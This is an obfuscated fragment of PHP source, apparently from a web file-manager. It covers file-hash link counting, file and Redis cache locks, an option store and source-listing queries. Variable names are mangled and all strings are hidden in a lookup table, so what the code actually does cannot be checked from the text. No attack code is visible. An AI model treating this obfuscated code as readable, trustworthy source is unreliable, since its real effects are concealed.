$Ùõ·ÎÍ” =& $_SERVER[§ŒØóıü]; $Óûœ¯  = $this->createFileName($Éñ¦Èî€, $îïà¥ûÃ, $êá·³°è); $´£–ú˜ = get_path_father($Óûœ¯ ); $ùğ¦–€† = get_path_this($Óûœ¯ ); if ($–ÈŠ«¡Ç) { $Ò®³§Ï  = IO::move($°ø¬›, $´£–ú˜, !1, $ùğ¦–€†); } else { $Ò®³§Ï  = IO::copy($°ø¬›, $´£–ú˜, !1, $ùğ¦–€†); } if (!$Ò®³§Ï ) { return !1; } $¬Éìºş = KodIO::defaultDriver(); $ØÒˆíî = array($Ùõ·ÎÍ”[545] => $Ä³ô¤, $Ùõ·ÎÍ”[1923] => 1, $Ùõ·ÎÍ”[420] => $Éñ¦Èî€, $Ùõ·ÎÍ”[814] => $¬Éìºş[$Ùõ·ÎÍ”[399]], $Ùõ·ÎÍ”[421] => $Óûœ¯ , $Ùõ·ÎÍ”[1924] => $îïà¥ûÃ, $Ùõ·ÎÍ”[1925] => $êá·³°è); return $ØÒˆíî; } public function addFileCheckExist($˜ß‘µĞ», $—ÆÃıµ, $Å«õĞí‡) { $¸üÔÁñ¦ =& $_SERVER[§ŒØóıü]; $ù†Âá™Ø = $this->findByHash($˜ß‘µĞ», $—ÆÃıµ); if (!$ù†Âá™Ø) { return !1; } $èŒ€ØóÆ = array($¸üÔÁñ¦[1923] => intval($ù†Âá™Ø[$¸üÔÁñ¦[1930]]) + 1, $¸üÔÁñ¦[545] => $Å«õĞí‡); $this->where(array($¸üÔÁñ¦[469] => $ù†Âá™Ø[$¸üÔÁñ¦[468]]))->save($èŒ€ØóÆ); return $ù†Âá™Ø; } public function remove($½£ˆİ™Ô) { $this->linkCountChange($½£ˆİ™Ô, !1); $this->clearEmpty(); return !0; } public function linkAdd($×ñîöÈ³) { $this->linkCountChange($×ñîöÈ³, !0); } public function linkCountChange($•–€´Ò, $æ‚íŠ•Ø) { $ÀƒÇÍù =& $_SERVER[§ŒØóıü]; if (!$•–€´Ò) { return; } if (!is_array($•–€´Ò)) { $•–€´Ò = array($•–€´Ò); } $ÍÏ•Ø©Ô = array(); foreach ($•–€´Ò as $İ¶†¿Â¼) { $„˜¬Í´ = $İ¶†¿Â¼ . $ÀƒÇÍù[12]; if (!$ÍÏ•Ø©Ô[$„˜¬Í´]) { $ÍÏ•Ø©Ô[$„˜¬Í´] = 0; } $ÍÏ•Ø©Ô[$„˜¬Í´]++; } $ÚõŸ‘óí = array(); foreach ($ÍÏ•Ø©Ô as $İ¶†¿Â¼ => $ãŒ…¢Ñ ) { $„˜¬Í´ = $ãŒ…¢Ñ  . $ÀƒÇÍù[12]; if (!$ÚõŸ‘óí[$„˜¬Í´]) { $ÚõŸ‘óí[$„˜¬Í´] = array(); } $ÚõŸ‘óí[$„˜¬Í´][] = $İ¶†¿Â¼; } foreach ($ÚõŸ‘óí as $ãŒ…¢Ñ  => $À°Ë¿œ) { if (!$À°Ë¿œ) { continue; } $ãŒ…¢Ñ  = $æ‚íŠ•Ø ? $ãŒ…¢Ñ  : -intval($ãŒ…¢Ñ ); $‹¡ÉßÍ© = array($ÀƒÇÍù[468] => array($ÀƒÇÍù[7], $À°Ë¿œ)); if ($ãŒ…¢Ñ  < 0) { $‹¡ÉßÍ©[$ÀƒÇÍù[1930]] = array($ÀƒÇÍù[1021], abs($ãŒ…¢Ñ )); } $this->where($‹¡ÉßÍ©)->setAdd($ÀƒÇÍù[1930], $ãŒ…¢Ñ ); } } public function findByHash($³Òãı‹ê, $–äİìú = false) { $ÌÜ—Â›Œ =& $_SERVER[§ŒØóıü]; if (!$³Òãı‹ê && !$–äİìú) { return !1; } $íŸ¹à€° = array($ÌÜ—Â›Œ[1924] => $³Òãı‹ê); if ($–äİìú) { $íŸ¹à€° = array($ÌÜ—Â›Œ[1925] => $–äİìú); } return $this->order($ÌÜ—Â›Œ[1931])->where($íŸ¹à€°)->find(); } public function clearEmpty($ç¸ûø®– = 0) { $ÄİÔé¹Û =& $_SERVER[§ŒØóıü]; $¬‰šŞ¥À = time() - 3600 * 24 * $ç¸ûø®–; $áµ„µÖ = $ÄİÔé¹Û[1932] . $¬‰šŞ¥À; $ÄÁÓÙê» = $this->where($áµ„µÖ)->select(); if (!$ÄÁÓÙê») { return; } $ ÃºÂ = new Task($ÄİÔé¹Û[1933], $ÄİÔé¹Û[12], count($ÄÁÓÙê»)); foreach ($ÄÁÓÙê» as $’ç¾‘ª) { $ ÃºÂ->update(1); $this->resetFile($’ç¾‘ª); } $ ÃºÂ->end(); } public function resetFile($á´øŞè) { $¾º½ˆúä =& $_SERVER[§ŒØóıü]; $•ÆÖ¬¸ª = array($¾º½ˆúä[469] => $á´øŞè[$¾º½ˆúä[468]]); $Ä–›¸¬ˆ = Model($¾º½ˆúä[1345])->where($•ÆÖ¬¸ª)->count(); $”õ¯ûõû = Model($¾º½ˆúä[1934])->where($•ÆÖ¬¸ª)->count(); $Úª½˜ Ğ = intval($Ä–›¸¬ˆ) + intval($”õ¯ûõû); if ($Úª½˜ Ğ == 0) { IO::remove($á´øŞè[$¾º½ˆúä[84]]); Model($¾º½ˆúä[1935])->delete($á´øŞè[$¾º½ˆúä[468]]); $this->where($•ÆÖ¬¸ª)->delete(); $this->metaSet($á´øŞè[$¾º½ˆúä[468]], null, null); return; } if ($á´øŞè[$¾º½ˆúä[1930]] != $Úª½˜ Ğ) { $this->where($•ÆÖ¬¸ª)->save(array($¾º½ˆúä[1923] => $Úª½˜ Ğ)); } } public function storageInfo($€Õ´ÊÙ = false) { $àÔ‡‰ûæ =& $_SERVER[§ŒØóıü]; $‡ª¹Ïß¡ = $this->count() + 0.0; $Ä¶¸ò » = 0; $áâÈˆÕ² = 1; $ñıŸãŸŒ = 0; $‰ÈÊ¯› = 5000; for ($¯¹³ø–è = 0; $¯¹³ø–è < $‡ª¹Ïß¡; $¯¹³ø–è = $¯¹³ø–è + $‰ÈÊ¯›) { $Ø¸ÈÎÌº = $this->limit($¯¹³ø–è, $¯¹³ø–è + $‰ÈÊ¯›)->select(); foreach ($Ø¸ÈÎÌº as $ĞÌº·æ) { $áâÈˆÕ² += $ĞÌº·æ[$àÔ‡‰ûæ[76]] * $ĞÌº·æ[$àÔ‡‰ûæ[1930]]; $Ä¶¸ò » += $ĞÌº·æ[$àÔ‡‰ûæ[76]] * ($ĞÌº·æ[$àÔ‡‰ûæ[1930]] - 1); $ñıŸãŸŒ += $ĞÌº·æ[$àÔ‡‰ûæ[1930]]; } } $¬ğÅ¦ôÁ = array($àÔ‡‰ûæ[1936] => $áâÈˆÕ², $àÔ‡‰ûæ[1937] => $Ä¶¸ò », $àÔ‡‰ûæ[1938] => $Ä¶¸ò » / $áâÈˆÕ², $àÔ‡‰ûæ[80] => $‡ª¹Ïß¡, $àÔ‡‰ûæ[1939] => $ñıŸãŸŒ); return $¬ğÅ¦ôÁ; } } goto cöÊë¶¨©¯; B¤ó•‹¬Â: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $³ÚÊĞˆÏ =& $_SERVER[§ŒØóıü]; $„Î³¥ğó = $GLOBALS[$³ÚÊĞˆÏ[6]][$³ÚÊĞˆÏ[349]]; self::$cachePath = $„Î³¥ğó[$³ÚÊĞˆÏ[200]][$³ÚÊĞˆÏ[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($…¸ñ©äß, $¶‹¡¹¾è = 0) { $ÀÖÁù  =& $_SERVER[§ŒØóıü]; $Çïí Íí = microtime(!0); $çÎ»ŸöÖ = $Çïí Íí + $¶‹¡¹¾è + 0.0001; $ã‹òÈÕ = rtrim(self::$cachePath, $ÀÖÁù [8]) . $ÀÖÁù [869] . md5($…¸ñ©äß) . $ÀÖÁù [866]; if (file_exists($ã‹òÈÕ) && filemtime($ã‹òÈÕ) && filemtime($ã‹òÈÕ) < time() - 10) { @unlink($ã‹òÈÕ); } do { if (file_exists($ã‹òÈÕ)) { cacheLockWait(); continue; } $÷üá´¦Ã = fopen($ã‹òÈÕ, $ÀÖÁù [870]); if (!$÷üá´¦Ã) { return !1; } $†“ü£¯Á = flock($÷üá´¦Ã, LOCK_EX | LOCK_NB); self::$caches[$…¸ñ©äß] = array($ÀÖÁù [871] => $÷üá´¦Ã, $ÀÖÁù [200] => $ã‹òÈÕ); fwrite($÷üá´¦Ã, $çÎ»ŸöÖ); clearstatcache(); if ($÷üá´¦Ã && $†“ü£¯Á) { return !0; } cacheLockWait(); } while (microtime(!0) < $çÎ»ŸöÖ); $this->unlock($…¸ñ©äß); return !1; } public function lockGet($ˆ´’ä™‘) { $àâ¥šŒĞ =& $_SERVER[§ŒØóıü]; $º·Êé = rtrim(self::$cachePath, $àâ¥šŒĞ[8]) . $àâ¥šŒĞ[869] . md5($ˆ´’ä™‘) . $àâ¥šŒĞ[866]; return file_exists($º·Êé); } public function unlock($İèå«ê¯) { $ÓôÏî¯ó =& $_SERVER[§ŒØóıü]; $Ú¶£¡Ï = self::$caches[$İèå«ê¯]; if (!$Ú¶£¡Ï) { return; } @flock($Ú¶£¡Ï[$ÓôÏî¯ó[871]], LOCK_UN); @fclose($Ú¶£¡Ï[$ÓôÏî¯ó[871]]); @unlink($Ú¶£¡Ï[$ÓôÏî¯ó[200]]); unset(self::$caches[$İèå«ê¯]); } } class CacheLockRedis { public function lock($¨àŞ¥ŠÔ, $©á—¸©“ = 10) { $¯°¢Ş¦¬ = Cache::init(); $§–ç°“ = microtime(!0) + $©á—¸©“; while (microtime(!0) < $§–ç°“) { $áüÊ…”’ = $¯°¢Ş¦¬->get($¨àŞ¥ŠÔ); if (!$áüÊ…”’) { $†ÅëÙà¾ = $¯°¢Ş¦¬->setLock($¨àŞ¥ŠÔ, $§–ç°“, $©á—¸©“); if ($†ÅëÙà¾) { return !0; } } else { if ($áüÊ…”’ < microtime(!0)) { $¯°¢Ş¦¬->set($¨àŞ¥ŠÔ, $§–ç°“, $©á—¸©“ * 2); if ($¯°¢Ş¦¬->get($¨àŞ¥ŠÔ) === $áüÊ…”’) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($’ÌÛö²‰) { return Cache::init()->get($’ÌÛö²‰); } public function unlock($“½íúÎç) { return Cache::init()->remove($“½íúÎç); } } goto Då÷¬ÔÂĞ”; B›Õ„÷Ç–Ê: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($›Ÿãá‹¬ = false, $²¯Ò›¨ò = '', $ŸÎ–÷ÈŞ = false) { $×ÚÀ×æ =& $_SERVER[§ŒØóıü]; $›¡·Ğî = $this->cacheGet($²¯Ò›¨ò); $¶‹ù¤ñò = $this->optionDefault($²¯Ò›¨ò); $¶‹ù¤ñò = is_array($¶‹ù¤ñò) ? $¶‹ù¤ñò : array(); if (is_array($›¡·Ğî)) { $›¡·Ğî = array_merge($¶‹ù¤ñò, $›¡·Ğî); return $›Ÿãá‹¬ ? isset($›¡·Ğî[$›Ÿãá‹¬]) ? $›¡·Ğî[$›Ÿãá‹¬] : null : $›¡·Ğî; } $ø¼ì¸ìî = $this->filterWhere(array($×ÚÀ×æ[33] => $²¯Ò›¨ò)); $›¡·Ğî = $this->where($ø¼ì¸ìî)->select(); $›¡·Ğî = array_to_keyvalue($›¡·Ğî, $×ÚÀ×æ[94], $×ÚÀ×æ[374]); foreach ($›¡·Ğî as $‰¦·Öùì => $É»Û­ï‚) { if ($ŸÎ–÷ÈŞ || in_array($‰¦·Öùì, $this->jsonField)) { $›¡·Ğî[$‰¦·Öùì] = json_decode($É»Û­ï‚, !0); } } $this->cacheSet($²¯Ò›¨ò, $›¡·Ğî); $›¡·Ğî = array_merge($¶‹ù¤ñò, $›¡·Ğî); return $›Ÿãá‹¬ ? $›¡·Ğî[$›Ÿãá‹¬] : $›¡·Ğî; } public function set($¼åÒ¬Ä¥, $³É˜Û = false, $¨µ¾àİş = '') { $Äàèæ´ =& $_SERVER[§ŒØóıü]; $this->cacheRemove($¨µ¾àİş); $Êò„û‡ = array(); $öÃàÀº = is_array($¼åÒ¬Ä¥) ? $¼åÒ¬Ä¥ : array($¼åÒ¬Ä¥ => $³É˜Û); foreach ($öÃàÀº as $ÚªñÎ€Ê => $šÄÍ¨Ú¸) { if (is_array($šÄÍ¨Ú¸)) { $šÄÍ¨Ú¸ = json_encode_force($šÄÍ¨Ú¸); } $this->checkLength($šÄÍ¨Ú¸, !1, $this->tableName . $Äàèæ´[4] . $¼åÒ¬Ä¥); $šÄÍ¨Ú¸ = self::textEncode($šÄÍ¨Ú¸); $öÃàÀº = array($Äàèæ´[33] => $¨µ¾àİş, $Äàèæ´[94] => $ÚªñÎ€Ê, $Äàèæ´[374] => $šÄÍ¨Ú¸); $Êò„û‡[] = $this->filterWhere($öÃàÀº); } if (!$Êò„û‡) { return !0; } $´ØˆÚ…å = $this->cacheKey($Äàèæ´[400]); CacheLock::lock($´ØˆÚ…å); $êëŒüæÁ = $this->addAll($Êò„û‡, array(), !0); CacheLock::unlock($´ØˆÚ…å); return $êëŒüæÁ; } protected function optionDefault($Ã‰º™ãß = '') { return !1; } public function setDeep($êËÓæîó, $¯’¶û¶É = false, $íìÂ‡ïÁ = '') { $à¤³†Ù = explode($_SERVER[§ŒØóıü][10], $êËÓæîó); $¹â†‘ø‘ = $this->get(); array_set_value($¹â†‘ø‘, $êËÓæîó, $¯’¶û¶É); $this->set($à¤³†Ù[0], $¹â†‘ø‘[$à¤³†Ù[0]], $íìÂ‡ïÁ); } public function remove($¬¹¿ü¼ş, $‰¼ŠÃ» = '') { $¸Ù–¡Ô• =& $_SERVER[§ŒØóıü]; $this->cacheRemove($‰¼ŠÃ»); $ŞìÅïëì = $this->filterWhere(array($¸Ù–¡Ô•[94] => $¬¹¿ü¼ş, $¸Ù–¡Ô•[33] => $‰¼ŠÃ»)); if (is_null($¬¹¿ü¼ş)) { unset($ŞìÅïëì[$¸Ù–¡Ô•[94]]); } return $this->where($ŞìÅïëì)->delete(); } public function cacheSet($ÍÄÑ“ïÖ, $€Ş×öíÊ = false) { return Cache::set($this->cacheKey($ÍÄÑ“ïÖ), $€Ş×öíÊ); } public function cacheGet($Ú—¾Î¾) { return Cache::get($this->cacheKey($Ú—¾Î¾)); } public function cacheRemove($ğíĞ€Î) { return Cache::remove($this->cacheKey($ğíĞ€Î)); } protected function filterWhere($§ûñòç) { return $§ûñòç; } protected function cacheKey($Öç–íã) { return $Öç–íã; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\165\x72\143\145"; protected $tableMeta = array("\164\x61\x62\154\145\x4e\141\x6d\x65" => "\x69\x6f\137\163\157\x75\x72\x63\x65\x5f\155\145\x74\x61", "\155\x65\x74\x61\106\151\145\154\x64" => "\x73\x6f\165\x72\143\145\111\104"); protected $dataAuto = array(array("\x6d\x6f\144\151\146\x79\124\151\x6d\x65", "\164\x69\x6d\x65", "\151\x6e\x73\145\162\164", "\x66\x75\156\x63\x74\151\157\156"), array("\143\162\x65\x61\x74\145\x54\151\155\145", "\x74\x69\x6d\x65", "\x69\x6e\163\x65\162\x74", "\146\165\156\x63\x74\151\x6f\156"), array("\166\151\x65\167\x54\151\x6d\x65", "\164\x69\155\x65", "\x69\156\x73\x65\162\164", "\x66\165\156\143\164\151\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($½İ¿ñ²À) { return $this->listSource(array($_SERVER[§ŒØóıü][401] => $½İ¿ñ²À)); } public function typeName($øè¯í¾) { static $•Ê½°Éô = array(self::TYPE_SYSTEM => "\x73\x79\x73\164\145\x6d", self::TYPE_USER => "\165\163\145\162", self::TYPE_GROUP => "\147\x72\x6f\x75\x70"); return $•Ê½°Éô[$øè¯í¾ . $_SERVER[§ŒØóıü][12]]; } public function sourceListInfo($ äßª, $±—ó‹†‘ = false) { $¼¯ïÖ½× =& $_SERVER[§ŒØóıü]; $ äßª = $ äßª ? $ äßª : array(); $ äßª = array_filter(array_unique($ äßª)); if (!$ äßª) { return array(); } $Šá×ƒ©§ = $this->where(array($¼¯ïÖ½×[402] => array($¼¯ïÖ½×[7], $ äßª)))->select(); $this->_listDataApply($Šá×ƒ©§, $±—ó‹†‘); return array_to_keyvalue($Šá×ƒ©§, $¼¯ïÖ½×[402]); } public function pathInfoFilter(&$Î–ÛéœŠ) { $È—úĞúŠ =& $_SERVER[§ŒØóıü]; static $Ôó´ æ = false; static $´„¬İÔ = false; static $±òûÓõÚ = false; if (!$Ôó´ æ) { $ù´ÖŸ¥• = $È—úĞúŠ[403]; $ù´ÖŸ¥• .= $È—úĞúŠ[404]; $ù´ÖŸ¥• .= $È—úĞúŠ[405]; $ö®œÔˆ = $È—úĞúŠ[406]; $ö›‰Ó = explode($È—úĞúŠ[50], $ö®œÔˆ); $Ôó´ æ = explode($È—úĞúŠ[50], $ù´ÖŸ¥•); $´„¬İÔ = array(); foreach ($Ôó´ æ as $Ç—ï°¸„) { if (in_array($Ç—ï°¸„, $ö›‰Ó)) { continue; } $´„¬İÔ[] = $Ç—ï°¸„; } $±òûÓõÚ = explode($È—úĞúŠ[50], $È—úĞúŠ[407]); } foreach ($±òûÓõÚ as $ù£’ŒÀ®) { if (isset($Î–ÛéœŠ[$ù£’ŒÀ®])) { $Î–ÛéœŠ[$ù£’ŒÀ®] = intval($Î–ÛéœŠ[$ù£’ŒÀ®]); } } $Î–ÛéœŠ[$È—úĞúŠ[84]] = $È—úĞúŠ[408] . $Î–ÛéœŠ[$È—úĞúŠ[402]] . $È—úĞúŠ[409]; $Î–ÛéœŠ[$È—úĞúŠ[33]] = $Î–ÛéœŠ[$È—úĞúŠ[410]] == 1 ? $È—úĞúŠ[75] : $È—úĞúŠ[200]; $Î–ÛéœŠ[$È—úĞúŠ[411]] = $this->typeName($Î–ÛéœŠ[$È—úĞúŠ[411]]); if ($Î–ÛéœŠ[$È—úĞúŠ[410]] != 1) { $Î–ÛéœŠ[$È—úĞúŠ[174]] = $Î–ÛéœŠ[$È—úĞúŠ[412]]; unset($Î–ÛéœŠ[$È—úĞúŠ[412]]); } $ˆ‹èªÉ¹ = $Ôó´ æ; if (isset($Î–ÛéœŠ[$È—úĞúŠ[413]]) && $Î–ÛéœŠ[$È—úĞúŠ[413]][$È—úĞúŠ[414]] == -1) { $ˆ‹èªÉ¹ = $´„¬İÔ; } $Î–ÛéœŠ = array_field_key($Î–ÛéœŠ, $ˆ‹èªÉ¹); return $Î–ÛéœŠ; } public function listUserFav() { $Ø½¥Ô¥º =& $_SERVER[§ŒØóıü]; $ÂÙª—ğ = Model($Ø½¥Ô¥º[415])->listData(); $ş¢¬™şô = array_filter_by_field($ÂÙª—ğ, $Ø½¥Ô¥º[33], $Ø½¥Ô¥º[416]); $ş¢¬™şô = array_to_keyvalue($ş¢¬™şô, $Ø½¥Ô¥º[12], $Ø½¥Ô¥º[84]); if ($ş¢¬™şô) { $†±“ËŞ§ = $this->listSource(array($Ø½¥Ô¥º[417] => array($Ø½¥Ô¥º[418], $ş¢¬™şô))); } $†±“ËŞ§ = array_to_keyvalue($†±“ËŞ§[$Ø½¥Ô¥º[369]], $Ø½¥Ô¥º[402]); foreach ($ÂÙª—ğ as &$ˆ²—ò·´) { $ˆ²—ò·´ = array($Ø½¥Ô¥º[419] => $ˆ²—ò·´[$Ø½¥Ô¥º[399]], $Ø½¥Ô¥º[420] => $ˆ²—ò·´[$Ø½¥Ô¥º[32]], $Ø½¥Ô¥º[421] => $ˆ²—ò·´[$Ø½¥Ô¥º[84]], $Ø½¥Ô¥º[422] => $ˆ²—ò·´[$Ø½¥Ô¥º[33]], $Ø½¥Ô¥º[423] => $ˆ²—ò·´[$Ø½¥Ô¥º[201]], $Ø½¥Ô¥º[424] => $ˆ²—ò·´[$Ø½¥Ô¥º[85]]); if ($ˆ²—ò·´[$Ø½¥Ô¥º[33]] == $Ø½¥Ô¥º[416] && $†±“ËŞ§[$ˆ²—ò·´[$Ø½¥Ô¥º[84]]]) { $ˆ²—ò·´[$Ø½¥Ô¥º[87]] = $†±“ËŞ§[$ˆ²—ò·´[$Ø½¥Ô¥º[84]]]; } } unset($ˆ²—ò·´); return $ÂÙª—ğ; } public function listUserTag($Ï‡İ×Œ) { $ïÒÊÁ—à =& $_SERVER[§ŒØóıü]; if ($Ï‡İ×Œ && !is_array($Ï‡İ×Œ)) { $Ï‡İ×Œ = array($Ï‡İ×Œ); } $¸ëİŸ´ = Model($ïÒÊÁ—à[425])->listData(); $ĞÎı›«ˆ = array(); $µƒ¹¿ìş = array(); foreach ($¸ëİŸ´ as $ƒÔİú”Ÿ) { $¨²×¹÷¼ = $ƒÔİú”Ÿ[$ïÒÊÁ—à[84]]; if (!$¨²×¹÷¼) { continue; } if (!isset($µƒ¹¿ìş[$¨²×¹÷¼])) { $µƒ¹¿ìş[$¨²×¹÷¼] = array(); } $µƒ¹¿ìş[$¨²×¹÷¼][] = $ƒÔİú”Ÿ[$ïÒÊÁ—à[426]]; $ĞÎı›«ˆ[$ƒÔİú”Ÿ[$ïÒÊÁ—à[84]]] = $ƒÔİú”Ÿ; } $õªÊ¼©  = array(); $õŠ¥Øğ = array(); $Ö¤Ô×Ë™ = array(); foreach ($µƒ¹¿ìş as $ë±»„²… => $íš›ÕåÅ) { $ÊÃòöı = !0; if (!$Ï‡İ×Œ) { $õªÊ¼© [] = $ë±»„²…; continue; } foreach ($Ï‡İ×Œ as $Ğà”­áÊ) { if (!in_array($Ğà”­áÊ, $íš›ÕåÅ)) { $ÊÃòöı = !1; break; } } if (!$ÊÃòöı) { continue; } if (!is_numeric($ë±»„²…)) { $¼È”ñÙ = $ĞÎı›«ˆ[$ë±»„²…]; $ÚÔÆ– = array($ïÒÊÁ—à[32] => $¼È”ñÙ[$ïÒÊÁ—à[32]], $ïÒÊÁ—à[84] => $¼È”ñÙ[$ïÒÊÁ—à[84]], $ïÒÊÁ—à[33] => $¼È”ñÙ[$ïÒÊÁ—à[33]], $ïÒÊÁ—à[87] => array($ïÒÊÁ—à[427] => 1), $ïÒÊÁ—à[202] => !0); if ($¼È”ñÙ[$ïÒÊÁ—à[33]] == $ïÒÊÁ—à[200]) { $Ö¤Ô×Ë™[] = $ÚÔÆ–; } if ($¼È”ñÙ[$ïÒÊÁ—à[33]] == $ïÒÊÁ—à[75]) { $õŠ¥Øğ[] = $ÚÔÆ–; } continue; } $õªÊ¼© [] = $ë±»„²…; } if ($õªÊ¼© ) { $ªà¦ç¾è = $this->listSource(array($ïÒÊÁ—à[417] => array($ïÒÊÁ—à[418], $õªÊ¼© ))); } $ªà¦ç¾è = $ªà¦ç¾è ? $ªà¦ç¾è : array($ïÒÊÁ—à[82] => array(), $ïÒÊÁ—à[83] => array()); $ªà¦ç¾è[$ïÒÊÁ—à[82]] = array_merge($ªà¦ç¾è[$ïÒÊÁ—à[82]], $õŠ¥Øğ); $ªà¦ç¾è[$ïÒÊÁ—à[83]] = array_merge($ªà¦ç¾è[$ïÒÊÁ—à[83]], $Ö¤Ô×Ë™); if (isset($ªà¦ç¾è[$ïÒÊÁ—à[366]]) && count($õªÊ¼© ) == $ªà¦ç¾è[$ïÒÊÁ—à[366]][$ïÒÊÁ—à[367]]) { return $ªà¦ç¾è; } $„³Ñá˜Æ = array(); $ƒÊœÓ¨Œ = array_to_keyvalue($ªà¦ç¾è[$ïÒÊÁ—à[82]], $ïÒÊÁ—à[12], $ïÒÊÁ—à[402]); $•Ášƒø = array_to_keyvalue($ªà¦ç¾è[$ïÒÊÁ—à[83]], $ïÒÊÁ—à[12], $ïÒÊÁ—à[402]); $…ÉúÉ¤ë = array_merge($•Ášƒø, $ƒÊœÓ¨Œ); foreach ($õªÊ¼©  as $¨²×¹÷¼) { if (!in_array($¨²×¹÷¼, $…ÉúÉ¤ë)) { $„³Ñá˜Æ[] = $¨²×¹÷¼; } } if ($„³Ñá˜Æ) { Model($ïÒÊÁ—à[428])->removeBySource($„³Ñá˜Æ); } return $ªà¦ç¾è; } public function listUserRecycle() { $áéë =& $_SERVER[§ŒØóıü]; $ê¿™î ş = Model($áéë[429])->listData(); if (!$ê¿™î ş) { return array(); } $¬Ì™ÂÏ = array($áéë[417] => array($áéë[418], $ê¿™î ş), $áéë[430] => 1); return $this->listSource($¬Ì™ÂÏ); } public function listSource($İô†¨¤ğ, $¾£¸¯º¬ = 3000, $†õÈûÎë = false) { $áí©“ş¤ =& $_SERVER[§ŒØóıü]; if (!isset($İô†¨¤ğ[$áí©“ş¤[431]])) { $İô†¨¤ğ[$áí©“ş¤[431]] = 0; } if (isset($İô†¨¤ğ[$áí©“ş¤[432]]) && $İô†¨¤ğ[$áí©“ş¤[432]] == $áí©“ş¤[198]) { $İô†¨¤ğ[$áí©“ş¤[412]] = array($áí©“ş¤[331], $áí©“ş¤[433]); } $…¼ù±İ = $áí©“ş¤[434]; $÷óı”Ê¼ = $this->field($…¼ù±İ)->_makeOrder()->where($İô†¨¤ğ)->selectPage($¾£¸¯º¬); $this->_listPageCheck($÷óı”Ê¼, $…¼ù±İ, $İô†¨¤ğ); $this->_listDataApply($÷óı”Ê¼[$áí©“ş¤[369]], $†õÈûÎë); $this->_listMake($÷óı”Ê¼); return $÷óı”Ê¼; } private function _listPageCheck(&$ÒÓá¹“Ë, $“”Ö¤¼±, $â›ËÇË½) { $Ôµ¾Æ€± =& $_SERVER[§ŒØóıü]; if (!is_array($ÒÓá¹“Ë[$Ôµ¾Æ€±[366]])) { return; } $°ã‡ƒ‚³ = $ÒÓá¹“Ë[$Ôµ¾Æ€±[366]]; if ($°ã‡ƒ‚³[$Ôµ¾Æ€±[368]] <= 1) { return; } if ($°ã‡ƒ‚³[$Ôµ¾Æ€±[367]] >= 100000) { return; } if (Model($Ôµ¾Æ€±[435])->get($Ôµ¾Æ€±[436]) != $Ôµ¾Æ€±[437]) { return; } $“”Ö¤¼± = str_replace(array($Ôµ¾Æ€±[53], $Ôµ¾Æ€±[342], $Ôµ¾Æ€±[231]), $Ôµ¾Æ€±[12], $“”Ö¤¼±); $“”Ö¤¼± = $Ôµ¾Æ€±[438] . str_replace($Ôµ¾Æ€±[50], $Ôµ¾Æ€±[439], $“”Ö¤¼±) . $Ôµ¾Æ€±[440]; $©ş¾ù®£ = $Ôµ¾Æ€±[441]; $©ş¾ù®£ = $©ş¾ù®£ . $Ôµ¾Æ€±[442]; $ì×‘óŠË = $°ã‡ƒ‚³[$Ôµ¾Æ€±[363]] * ($°ã‡ƒ‚³[$Ôµ¾Æ€±[353]] - 1) . $Ôµ¾Æ€±[50] . $°ã‡ƒ‚³[$Ôµ¾Æ€±[363]]; $ù¾‘ì‡§ = $this->_makeOrder(!0); $›æÑ§’ß = $Ôµ¾Æ€±[438] . str_replace($Ôµ¾Æ€±[50], $Ôµ¾Æ€±[439], $ù¾‘ì‡§[0]); if (strpos($›æÑ§’ß, $Ôµ¾Æ€±[443])) { $›æÑ§’ß = str_replace($Ôµ¾Æ€±[443], $Ôµ¾Æ€±[444], $›æÑ§’ß); } else { $›æÑ§’ß .= $Ôµ¾Æ€±[445] . $ù¾‘ì‡§[1]; } $µğ‘°ÈÉ = array(); foreach ($â›ËÇË½ as $¹©§‚±à => $ŸóŞ‰Ï) { $µğ‘°ÈÉ[$Ôµ¾Æ€±[438] . $¹©§‚±à] = $ŸóŞ‰Ï; } $this->alias($Ôµ¾Æ€±[446])->field($“”Ö¤¼±)->limit($ì×‘óŠË)->order($›æÑ§’ß); $²‚éƒ = $this->join($©ş¾ù®£)->where($µğ‘°ÈÉ)->select(); if ($²‚éƒ) { $ÒÓá¹“Ë[$Ôµ¾Æ€±[369]] = $²‚éƒ; } } protected function _makeOrder($Ù‚ª‹…” = false) { $Ô×÷ˆî =& $_SERVER[§ŒØóıü]; $Ì÷¢º‚­ = Model($Ô×÷ˆî[447])->get($Ô×÷ˆî[448]); $ç¦ƒç´Ã = Model($Ô×÷ˆî[447])->get($Ô×÷ˆî[449]); $ìŸ›¶Û¼ = array($Ô×÷ˆî[450] => $Ô×÷ˆî[451], $Ô×÷ˆî[452] => $Ô×÷ˆî[453]); $şèÇßË© = array($Ô×÷ˆî[32] => $Ô×÷ˆî[32], $Ô×÷ˆî[76] => $Ô×÷ˆî[76], $Ô×÷ˆî[174] => $Ô×÷ˆî[412], $Ô×÷ˆî[454] => $Ô×÷ˆî[454], $Ô×÷ˆî[455] => $Ô×÷ˆî[456], $Ô×÷ˆî[201] => $Ô×÷ˆî[201], $Ô×÷ˆî[85] => $Ô×÷ˆî[85]); $ú“Åôş¹ = Input::get($Ô×÷ˆî[457], $Ô×÷ˆî[7], $Ì÷¢º‚­, array_keys($şèÇßË©)); $ Ñ›€Ï = Input::get($Ô×÷ˆî[458], $Ô×÷ˆî[7], $ç¦ƒç´Ã, array_keys($ìŸ›¶Û¼)); if (!in_array($ú“Åôş¹, array_keys($şèÇßË©))) { $ú“Åôş¹ = $Ô×÷ˆî[32]; } if (!in_array($ Ñ›€Ï, array_keys($ìŸ›¶Û¼))) { $ú“Åôş¹ = $Ô×÷ˆî[450]; } if ($ú“Åôş¹ == $Ô×÷ˆî[32]) { } $‰˜ÌêóÑ = $Ô×÷ˆî[459] . $şèÇßË©[$ú“Åôş¹] . $Ô×÷ˆî[53] . $ìŸ›¶Û¼[$ Ñ›€Ï]; $‰˜ÌêóÑ = rtrim(trim($‰˜ÌêóÑ), $Ô×÷ˆî[50]); if ($Ù‚ª‹…”) { return array($‰˜ÌêóÑ, $ìŸ›¶Û¼[$ Ñ›€Ï]); } return 